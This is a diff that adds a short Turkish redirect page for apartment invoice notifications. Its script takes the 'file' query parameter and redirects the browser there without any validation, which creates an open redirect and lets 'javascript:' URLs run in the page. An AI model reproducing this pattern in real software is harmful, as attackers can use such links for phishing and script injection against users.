@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Yönlendiriliyor...</title>
+</head>
+<body style="font-family: sans-serif; padding: 20px;">
+  <p>Dairenize ait bildirim açılıyor, lütfen bekleyin...</p>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const f = params.get("file");
+
+    if (f) {
+      const target = decodeURIComponent(f);
+      window.location.href = target;
+    } else {
+      document.body.innerHTML = "<h3>Fatura linki bulunamadı.</h3>";
+    }
+  </script>
+</body>
+</html>
